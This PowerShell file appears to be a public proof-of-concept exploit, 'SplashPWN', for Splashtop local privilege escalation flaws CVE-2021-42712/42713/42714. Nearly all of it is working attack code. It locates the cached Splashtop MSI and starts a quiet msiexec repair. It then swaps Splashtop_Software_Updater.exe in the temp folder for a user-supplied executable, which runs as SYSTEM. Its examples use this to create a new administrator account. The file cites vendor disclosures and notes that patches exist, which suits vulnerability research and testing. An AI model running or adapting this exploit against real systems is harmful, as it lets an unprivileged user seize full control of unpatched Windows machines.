function Find-SplashtopGUID {
    [CmdletBinding()]
    param(
        [Parameter (Mandatory=$true)]
        $ProductName
    )

    $Installer = New-Object -ComObject WindowsInstaller.Installer
    $InstallerProducts = $Installer.ProductsEx("", "", 7)
    $InstalledProducts = ForEach($Product in $InstallerProducts){
        [PSCustomObject]@{
            ProductCode = $Product.ProductCode()
            LocalPackage = $Product.InstallProperty("LocalPackage")
            VersionString = $Product.InstallProperty("VersionString")
            ProductPath = $Product.InstallProperty("ProductName")
        }
    }
    $InstalledProducts | Where-Object {$_.ProductPath -match $ProductName} 
}

function art {
$art =  
"
      █████████            ████                    █████      ███████████  █████   ███   █████ ██████   █████
     ███░░░░░███          ░░███                   ░░███      ░░███░░░░░███░░███   ░███  ░░███ ░░██████ ░░███ 
    ░███    ░░░  ████████  ░███   ██████    █████  ░███████   ░███    ░███ ░███   ░███   ░███  ░███░███ ░███ 
    ░░█████████ ░░███░░███ ░███  ░░░░░███  ███░░   ░███░░███  ░██████████  ░███   ░███   ░███  ░███░░███░███ 
     ░░░░░░░░███ ░███ ░███ ░███   ███████ ░░█████  ░███ ░███  ░███░░░░░░   ░░███  █████  ███   ░███ ░░██████ 
     ███    ░███ ░███ ░███ ░███  ███░░███  ░░░░███ ░███ ░███  ░███          ░░░█████░█████░    ░███  ░░█████ 
    ░░█████████  ░███████  █████░░████████ ██████  ████ █████ █████           ░░███ ░░███      █████  ░░█████
     ░░░░░░░░░   ░███░░░  ░░░░░  ░░░░░░░░ ░░░░░░  ░░░░ ░░░░░ ░░░░░             ░░░   ░░░      ░░░░░    ░░░░░ 
                 ░███                                                                                        
                 █████                                                                                       
                ░░░░░                                                                                        
    
    Exploit for CVE-2021-42712 discovered by Ronnie Salomonsen
    Written by: Spencer Alessi @techspence
"
$art
}

function Invoke-SplashPWN {
    <#
    .SYNOPSIS
    POC Exploit for CVE-2021-42712, CVE-2021-42713, and CVE-2021-42714
    Splashtop Streamer, Splashtop Personal, and Splashtop Business 
    local privilege escalation vulnerability, discovered by Ronnie Salomonsen.

    .DESCRIPTION
    These Splashtop products for Windows contain a local privilege escalation vulnerability.
    The installation of the agent uses the Windows Installer framework and an MSI file is cached in c:\windows\installer. 
    An unprivileged user can trigger a repair operation, either by using the Windows Installer API or by running 
    "msiexec.exe /fa c:\windows\installer\[XXXXX].msi".

    Running a repair operation will trigger a number of file operations in the %TEMP% folder of the user triggering the repair. 
    Some of these operations will be performed from a SYSTEM context (started via the Windows Installer service), including the execution of temporary files.

    These products all have patched versions available.

    .PARAMETER Exepath
    The full path to your executable

    .PARAMETER NewUser
    If your exe creates a new user, this is the user name to check when finished

    .PARAMETER ProductName
    The 'Subject' of the product you want to exploit

    .EXAMPLE
    Invoke-SplashPWN -Exepath c:\users\lowprivuser\Desktop\adduser.exe -NewUser splashpwn

    .EXAMPLE
    Invoke-SplashPWN -EXEPath c:\users\lowprivuser\Desktop\HelloWorld.exe

    .NOTES
    https://github.com/mandiant/Vulnerability-Disclosures/blob/master/2022/MNDT-2022-0005/MNDT-2022-0005.md
    https://github.com/mandiant/Vulnerability-Disclosures/blob/master/2022/MNDT-2022-0006/MNDT-2022-0006.md
    https://github.com/mandiant/Vulnerability-Disclosures/blob/master/2022/MNDT-2022-0007/MNDT-2022-0007.md
    https://www.cve.org/CVERecord?id=CVE-2021-42712
    https://support-splashtopbusiness.splashtop.com/hc/en-us/articles/4416188695323-Splashtop-Streamer-version-v3-5-0-0-for-Windows-released-includes-SOS-version-3-5-0-0

    #>
    [CmdletBinding()]
    param(
        [Parameter (Mandatory=$true)]
        $Exepath,
        [Parameter (Mandatory=$false,ParameterSetName = 'NewUser')]
        $NewUser,
        [Parameter (Mandatory=$false)]
        $ProductName
    )

    if ($VerbosePreference -eq "Continue") {
        $ShowArt = art
        Write-Host $ShowArt -ForegroundColor DarkGreen
        Write-Verbose "[!] Executing SplashPwn, please wait..."
    } else {
        Write-Host "`n[!] Executing SplashPwn, please wait..."
    }

    if ($ProductName) {
        $ProductInfo = Find-SplashtopGUID -ProductName $ProductName
    } else {
        $ProductInfo = Find-SplashtopGUID -ProductName 'Splashtop Streamer'
    }
    $SplashtopGUID = ($ProductInfo).ProductCode
    $SplashtopMSI = ($ProductInfo).LocalPackage
    $SplashtopTempFolder = "$($env:LOCALAPPDATA)\temp\$SplashtopGUID"

    # initiate a repair of splashtop using msiexec
    Write-Verbose "[i] Starting a repair with msiexec"
    msiexec.exe /fa $SplashtopMSI /quiet

    # sleep to let msiexec start
    Write-Verbose "[i] Sleeping to let msiexec start"
    Start-Sleep 5

    # replace Splashtop_Software_Updater.exe with our own exe
    Write-Verbose "[i] Overwriting Splashtop_Software_Updater.exe with our own exe"
    Copy-Item -Path $EXEPath -Destination $SplashtopTempFolder\Splashtop_Software_Updater.exe -Force

    # wait for msiexec to finish
    Write-Verbose "[i] Sleep to let msiexec finish"
    Start-Sleep 45

    # Check if our exe ran successfully
    if ($NewUser){
        Write-Verbose "[i] Checking if our new user was created"

        if (Get-LocalUser -Name $NewUser -ErrorAction SilentlyContinue) {
            Write-Verbose "[SUCCESS] - New user was created!"
        } else {
            Write-Host "[ERROR] - New user NOT created"
        }

        $Administrators = Get-LocalGroupMember -Group Administrators | select -ExpandProperty Name
        if ($Administrators -match "splashpwn"){
            Write-Verbose "[SUCCESS] - New user was added to Administrators!"
        } else {
            Write-Host "[ERROR] - New user NOT added to Administrators"
        }
    } else {
        if ($VerbosePreference -eq "Continue") {
            Write-Verbose "[!] NOT creating a new user? Manually check if your exe was sucessful when finished"
        } else {
            Write-Host "[!] NOT creating a new user? Manually check if your exe was sucessful when finished"
        }
    }

    # Cleanup
    Write-Verbose "[i] Cleaning up temp files"

    if ($VerbosePreference -eq "Continue") {
        Write-Verbose "[+] Finished!"
    } else {
        Write-Host "[+] SplashPWN is finished. May the odds be ever in your favor"
    }
}